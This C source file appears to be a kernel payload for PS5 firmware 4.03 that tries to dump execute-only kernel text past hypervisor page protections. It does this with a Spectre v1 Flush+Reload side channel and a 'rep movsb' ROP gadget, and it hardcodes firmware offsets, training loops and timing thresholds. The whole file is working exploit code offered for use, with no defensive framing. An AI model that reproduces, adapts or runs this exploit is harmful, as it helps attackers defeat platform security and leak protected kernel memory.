#include <stdint.h>

/*
 * spectre_xom_read — Spectre v1 Flush+Reload ktext byte reader + rep movsb alternative
 *
 * PS5 FW 4.03, AMD Zen 2. Hypervisor enforces XOM on ktext via NPT.
 * This payload attempts to speculatively bypass NPT read restrictions
 * using a Spectre v1 bounds-check bypass with a Flush+Reload cache oracle.
 *
 * As a secondary test, tries the known rep_movsb;pop rbp;ret ktext gadget
 * to directly copy ktext bytes (in case HV instruction emulation skips
 * NPT read checks).
 *
 * fw_ver encoding:
 *   0x7000         = Control test: read known kdata byte via Spectre
 *   0x7100 + idx   = Attack: read ktext byte at get_timer_freq + idx
 *   0x7200         = rep movsb: copy 64 bytes from get_timer_freq
 *   0x7300 + off16 = Set target base (ktext_base + off16*256) for 0x71xx
 *
 * Output layout (288 uint64_t slots, 2304 bytes):
 *   [0]     = MAGIC (lo32) | status (hi32)
 *   [1]     = kdata_base
 *   [2]     = ktext_base
 *   [3]     = mode | (target_offset << 16)
 *   [4]     = td_pcb
 *   [5]     = probe_base
 *   [6]     = threshold
 *   [7]     = num_rounds
 *   [8]     = control: expected byte
 *   [9]     = control: recovered byte
 *   [10]    = control: confidence
 *   [11]    = bytes_recovered / rep_movsb fault status
 *   [12..43] = per-byte results or rep_movsb data
 *   [64..95] = histogram dump for first byte (256 entries, packed 8 per slot)
 *   [287]   = end marker
 */

#define MAGIC_SPEC       0x53504543   /* "SPEC" */
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets */
#define OFF_GET_TIMER_FREQ  0x294320  /* ktext offset of get_timer_freq */
#define OFF_IDT          0x64cdc80
#define OFF_REP_MOVSB    (-0x99002a)  /* rep movsb; pop rbp; ret */

#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

/* Spectre parameters */
#define PROBE_OFFSET     0x4000000    /* 64MB into kdata */
#define PAGE_STRIDE      4096
#define TRAIN_ARRAY_SZ   16
#define NROUNDS          200          /* rounds per byte */
#define TRAIN_ITERS      30           /* 29 training + 1 attack per group */
#define CACHE_THRESHOLD  80           /* cycles: below = cache hit */

/* Output slot count */
#define OUT_SLOTS        288

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

/* ------------------------------------------------------------------ */
/* Inline ASM helpers                                                  */
/* ------------------------------------------------------------------ */

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline void clflush(volatile void *addr)
{
    __asm__ volatile("clflush (%0)" :: "r"(addr) : "memory");
}

static inline void lfence_barrier(void)
{
    __asm__ volatile("lfence" ::: "memory");
}

static inline void mfence_barrier(void)
{
    __asm__ volatile("mfence" ::: "memory");
}

static inline uint64_t rdtscp_val(void)
{
    uint32_t lo, hi, aux;
    __asm__ volatile("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

/* ------------------------------------------------------------------ */
/* Training data — MUST be initialized (no .bss)                       */
/* ------------------------------------------------------------------ */

static uint8_t training_data[TRAIN_ARRAY_SZ] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0
};

/*
 * Volatile bound for the speculative gadget. Flushing this from cache
 * before the attack iteration delays branch resolution, creating a
 * speculation window where the CPU executes the branch body with the
 * attacker-controlled index.
 */
static volatile uint64_t array_bound = TRAIN_ARRAY_SZ;

/* ------------------------------------------------------------------ */
/* Spectre v1 victim function                                          */
/*                                                                     */
/* The branch `if (x < *bound)` is trained to predict TAKEN. On the    */
/* attack iteration, x is out-of-bounds (pointing to ktext), and       */
/* *bound is not in cache, so the CPU speculatively executes the body   */
/* before the branch resolves. The speculative load from the probe      */
/* array encodes the secret byte into cache state.                     */
/* ------------------------------------------------------------------ */

static void __attribute__((noinline))
victim_function(uint8_t *array, volatile uint64_t *bound,
                uint64_t probe_base, uint64_t x)
{
    if (x < *bound) {
        uint64_t val = array[x];
        volatile uint8_t *probe_addr =
            (volatile uint8_t *)(probe_base + val * PAGE_STRIDE);
        (void)*probe_addr;  /* speculative cache load */
    }
}

/* ------------------------------------------------------------------ */
/* Read one byte via Spectre v1 Flush+Reload                           */
/*                                                                     */
/* Returns the recovered byte. Writes confidence to *out_conf.         */
/* Writes full histogram to hist_out (256 entries) if non-NULL.        */
/* ------------------------------------------------------------------ */

static uint8_t spectre_read_byte(
    uint64_t target_addr,
    uint64_t probe_base,
    int num_rounds,
    uint16_t *out_conf,
    uint16_t *hist_out)
{
    /* Histogram on stack: 256 * 2 = 512 bytes */
    uint16_t histogram[256];
    for (int i = 0; i < 256; i++)
        histogram[i] = 0;

    /* Compute attack offset: index into training_data that reaches target */
    uint64_t attack_offset = target_addr - (uint64_t)training_data;

    for (int round = 0; round < num_rounds; round++) {
        /* 1. Flush all 256 probe pages */
        for (int i = 0; i < 256; i++)
            clflush((void *)(probe_base + (uint64_t)i * PAGE_STRIDE));

        mfence_barrier();

        /* 2. Training + attack: 29 training, 1 attack */
        for (int mix_i = 0; mix_i < TRAIN_ITERS; mix_i++) {
            /* Flush the bound variable to delay branch resolution */
            clflush((void *)&array_bound);
            mfence_barrier();
            lfence_barrier();

            /*
             * Branchless index selection:
             * When mix_i < 29: use training index (in-bounds)
             * When mix_i == 29: use attack_offset (out-of-bounds → ktext)
             *
             * (mix_i - 29) is negative for mix_i < 29 → bit 63 = 1
             * >> 63 gives 1, ~1 = 0 → mask = 0 (training)
             * When mix_i == 29: (0) >> 63 = 0, ~0 = all-ones → mask (attack)
             */
            uint64_t diff = (uint64_t)((int64_t)mix_i - (TRAIN_ITERS - 1));
            uint64_t mask = ~(diff >> 63);
            uint64_t training_idx = (uint64_t)(mix_i % TRAIN_ARRAY_SZ);
            uint64_t x = (attack_offset & mask) | (training_idx & ~mask);

            victim_function(training_data, &array_bound, probe_base, x);
        }

        mfence_barrier();
        lfence_barrier();

        /* 3. Timing phase: measure access time to each probe page */
        /* Disable interrupts for clean timing */
        __asm__ volatile("cli" ::: "memory");

        for (int i = 0; i < 256; i++) {
            /*
             * Scan in mixed order to reduce prefetcher correlation.
             * Simple xor shuffle: i ^ 0xA5 gives a permutation of 0..255.
             */
            int idx = i ^ 0xA5;

            volatile uint8_t *addr =
                (volatile uint8_t *)(probe_base + (uint64_t)idx * PAGE_STRIDE);

            lfence_barrier();
            uint64_t t0 = rdtscp_val();
            lfence_barrier();
            (void)*addr;
            lfence_barrier();
            uint64_t t1 = rdtscp_val();
            lfence_barrier();

            uint64_t delta = t1 - t0;
            if (delta < CACHE_THRESHOLD)
                histogram[idx]++;
        }

        __asm__ volatile("sti" ::: "memory");
    }

    /* Find best candidate (exclude training values 0-15 for ktext reads) */
    uint8_t best = 0;
    uint16_t best_count = 0;
    for (int i = 0; i < 256; i++) {
        if (histogram[i] > best_count) {
            best_count = histogram[i];
            best = (uint8_t)i;
        }
    }

    if (out_conf)
        *out_conf = best_count;

    /* Copy histogram if requested */
    if (hist_out) {
        for (int i = 0; i < 256; i++)
            hist_out[i] = histogram[i];
    }

    return best;
}

/* ------------------------------------------------------------------ */
/* rep movsb direct copy attempt                                       */
/* ------------------------------------------------------------------ */

static uint64_t try_rep_movsb(
    uint64_t ktext_src,
    uint64_t kdata_dst,
    uint64_t count,
    uint64_t gadget_addr,
    uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        /* Arm pcb_onfault */
        "leaq 2f(%%rip), %%rax\n\t"
        "movq %%rax, (%[onfault])\n\t"

        /* Set up rep movsb: RSI=src, RDI=dst, RCX=count */
        "movq %[src], %%rsi\n\t"
        "movq %[dst], %%rdi\n\t"
        "movq %[cnt], %%rcx\n\t"

        /* The gadget is: rep movsb; pop rbp; ret
         * Push a dummy RBP for the pop */
        "pushq %%rbp\n\t"

        /* Call the gadget */
        "callq *%[gadget]\n\t"

        /* Success path */
        "movq $0, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        /* Fault recovery path */
        "2:\n\t"
        "addq $8, %%rsp\n\t"  /* fix RSP: callq pushed ret addr */
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"

        "1:\n\t"
        : [result] "=&r"(result)
        : [src] "r"(ktext_src), [dst] "r"(kdata_dst),
          [cnt] "r"(count), [gadget] "r"(gadget_addr),
          [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return result;
}

/* ------------------------------------------------------------------ */
/* Entry point                                                         */
/* ------------------------------------------------------------------ */

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    /* Zero output */
    for (int i = 0; i < OUT_SLOTS; i++)
        out[i] = 0;

    /* Derive addresses */
    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t probe_base = kdata_base + PROBE_OFFSET;

    /* Get td_pcb for onfault */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

    /* Write header (magic written early for crash diagnostics) */
    out32[0] = MAGIC_SPEC;
    out32[1] = 0x01;  /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[4] = td_pcb;
    out[5] = probe_base;
    out[6] = CACHE_THRESHOLD;
    out[7] = NROUNDS;
    mfence_barrier();

    uint16_t mode_hi = (fw_ver >> 8) & 0xFF;
    uint16_t mode_lo = fw_ver & 0xFF;

    if (mode_hi == 0x70) {
        /* ============================================================
         * MODE 0x7000: CONTROL TEST
         * Read a known kdata byte via Spectre to validate the pipeline.
         * We read the first byte of the IDT (known, we can direct-read it).
         * ============================================================ */
        uint64_t target = kdata_base + OFF_IDT;
        uint8_t expected = read1(target);

        out[3] = 0x7000;
        out[8] = expected;

        uint16_t confidence = 0;
        uint16_t hist_buf[256];
        uint8_t recovered = spectre_read_byte(
            target, probe_base, NROUNDS, &confidence, hist_buf);

        out[9] = recovered;
        out[10] = confidence;
        out[11] = (expected == recovered) ? 1 : 0;

        /* Dump histogram packed: 8 uint16_t per slot → 32 slots for 256 entries */
        for (int i = 0; i < 256; i++) {
            int slot = 64 + (i / 4);
            int shift = (i % 4) * 16;
            out[slot] |= ((uint64_t)hist_buf[i] & 0xFFFF) << shift;
        }

        /* Second-best candidate */
        uint8_t second = 0;
        uint16_t second_count = 0;
        for (int i = 0; i < 256; i++) {
            if (i == recovered) continue;
            if (hist_buf[i] > second_count) {
                second_count = hist_buf[i];
                second = (uint8_t)i;
            }
        }
        out[12] = target;
        out[13] = (uint64_t)recovered | ((uint64_t)confidence << 8)
                | ((uint64_t)second << 16) | ((uint64_t)second_count << 24);

        out32[1] = 0x10;  /* control done */

    } else if (mode_hi == 0x71) {
        /* ============================================================
         * MODE 0x7100 + idx: KTEXT ATTACK
         * Read ktext byte at get_timer_freq + idx.
         * This is the real test: can Spectre bypass NPT XOM?
         * ============================================================ */
        uint64_t target_offset = OFF_GET_TIMER_FREQ + mode_lo;
        uint64_t target = ktext_base + target_offset;

        out[3] = 0x7100 | ((uint64_t)target_offset << 16);

        /* Read up to 8 bytes starting at target */
        int num_bytes = 8;
        if (mode_lo + num_bytes > 255)
            num_bytes = 1;  /* stay within single-byte range */

        out[11] = num_bytes;

        for (int b = 0; b < num_bytes; b++) {
            uint16_t conf = 0;
            uint16_t hist_buf[256];
            uint8_t byte_val = spectre_read_byte(
                target + b, probe_base, NROUNDS, &conf,
                (b == 0) ? hist_buf : (uint16_t *)0);

            /* Per-byte result */
            out[12 + b * 4 + 0] = target + b;
            out[12 + b * 4 + 1] = (uint64_t)byte_val | ((uint64_t)conf << 8);

            /* Noise metric: sum of all non-best histogram entries */
            if (b == 0) {
                uint64_t noise = 0;
                uint8_t second = 0;
                uint16_t second_count = 0;
                for (int i = 0; i < 256; i++) {
                    if (i != byte_val)
                        noise += hist_buf[i];
                    if (i != byte_val && hist_buf[i] > second_count) {
                        second_count = hist_buf[i];
                        second = (uint8_t)i;
                    }
                }
                out[12 + 2] = noise;
                out[12 + 3] = (uint64_t)second | ((uint64_t)second_count << 8);

                /* Histogram dump for byte 0 */
                for (int i = 0; i < 256; i++) {
                    int slot = 64 + (i / 4);
                    int shift = (i % 4) * 16;
                    out[slot] |= ((uint64_t)hist_buf[i] & 0xFFFF) << shift;
                }
            }
        }

        out32[1] = 0x11;  /* attack done */

    } else if (mode_hi == 0x72) {
        /* ============================================================
         * MODE 0x7200: REP MOVSB DIRECT COPY
         * Try copying 64 bytes from ktext via rep_movsb;pop rbp;ret gadget.
         * If HV emulates rep movsb without NPT read check → we get bytes.
         * ============================================================ */
        uint64_t ktext_src = ktext_base + OFF_GET_TIMER_FREQ;
        uint64_t kdata_dst = kdata_base + 0x5000;  /* safe kdata buffer */
        uint64_t count = 64;
        uint64_t gadget = kdata_base + OFF_REP_MOVSB;  /* ktext address */

        out[3] = 0x7200 | ((uint64_t)OFF_GET_TIMER_FREQ << 16);

        /* Zero destination buffer first */
        for (int i = 0; i < 8; i++)
            write8(kdata_dst + i * 8, 0);

        uint64_t fault = try_rep_movsb(
            ktext_src, kdata_dst, count, gadget, onfault_addr);

        out[11] = fault;  /* 0 = success, 0xFAFA... = faulted */

        /* Copy result bytes to output */
        for (int i = 0; i < 8; i++)
            out[12 + i] = read8(kdata_dst + i * 8);

        /* Mark source and gadget addresses */
        out[20] = ktext_src;
        out[21] = gadget;
        out[22] = kdata_dst;

        out32[1] = 0x20;  /* rep movsb done */

    } else {
        out32[1] = 0xFF;  /* unknown mode */
    }

    out[287] = 0xDEADCAFE53504543ULL;
    mfence_barrier();
    return 0;
}
